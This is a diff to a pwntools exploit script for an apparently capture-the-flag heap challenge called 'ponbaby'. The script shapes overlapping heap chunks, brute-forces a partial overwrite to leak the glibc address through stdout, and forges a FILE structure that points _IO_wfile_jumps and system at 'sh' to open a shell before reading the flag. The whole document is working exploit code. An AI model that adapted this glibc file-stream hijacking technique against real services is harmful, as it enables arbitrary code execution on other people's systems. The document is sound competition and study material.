@@ -36,7 +36,7 @@ c
 
 while True:
   try:
-    io = remote('ponbaby-1.q.2026.volgactf.ru', 45002)
+    io = start()
     for i in range(4): make(i, 0x4b8, b'\x00'*8+p64(0x4b0|1)+b'\n')
     free(0)
     make(0, 0x4b8, b'\x00'*0x4b8+p16((0x4c0*2)|1))
@@ -47,14 +47,15 @@ while True:
     make(0, 0x4b8, b'\x00'*0x4b8+p16(((0x4c0*2)+0x10)|1))
     free(1)
     make(1, 0x4b8, b'\x00'*0x418+p64(0x300|1)+p16(7)+p16(6)+p16(7)*2+(p16(7)*4)*(0x90//8)+p16(0x4d0|1|(1<<1)))
-    make(4, 0x4c8, p16(9<<12|libc.sym._IO_2_1_stdout_&0xfff)+b'\n')
+    make(4, 0x4c8, p16(4<<12|libc.sym._IO_2_1_stdout_&0xfff)+b'\n')
     gift(0x28, p64(0xfbad1800)+p64(0)*3+b'\x00'+b'\n')
     leak=u64(io.recv(8))
     if (0x700000000000 <= leak <= 0x7fffffffffff) and (leak&0xfff==0x644):
       libc.address=leak-0x234644
-      log.info(hex(libc.address))
+      log.info(f'{libc.address = :#x}')
       break
-  except: pass
+    io.close()
+  except: io.close()
 
 free(0)
 make(0, 0x4b8, b'\x00'*0x4b8+p16(((0x4c0*2)+0x10)|1))
@@ -63,20 +64,21 @@ make(1, 0x4b8, b'\x00'*0x418+p64(0x300|1)+(p16(7)*4)*3+p16(7)+p16(6)+p16(7)*2+(p
 make(5, 0x4c8, p64(0)*12+p64(libc.sym._IO_2_1_stdout_)+b'\n')
 
 fs = flat(
-    {
-        0x00: b" sh\x00",
-        0x08: p64(0),
-        0x20: p64(0),
-        0x28: p64(1),
-        0x68: libc.symbols["system"],
-        0x88: libc.symbols["_IO_stdfile_0_lock"],
-        0xa0: libc.sym._IO_2_1_stdout_-0x10,
-        0xc0: p64(0),
-        0xd0: libc.sym._IO_2_1_stdout_,
-        0xd8: libc.symbols["_IO_wfile_jumps"]-0x38+0x18,
-    },
-    filler=b'\x00'
+  {
+    0x00: b"aa;sh",
+    0x08: p64(0),
+    0x20: p64(0),
+    0x28: p64(1),
+    0x68: libc.symbols["system"],
+    0x88: libc.symbols["_IO_stdfile_0_lock"],
+    0xa0: libc.sym._IO_2_1_stdout_-0x10,
+    0xc0: p64(0),
+    0xd0: libc.sym._IO_2_1_stdout_,
+    0xd8: libc.symbols["_IO_wfile_jumps"]-0x38+0x18,
+  },
+  filler=b'\x00'
 )
 
 gift(0xe0, fs)
-io.interactive()
+io.sendlineafter(b'sh:', b'cat flag*')
+log.success(io.recvuntil(b'}').split(b'\n')[-1].decode())
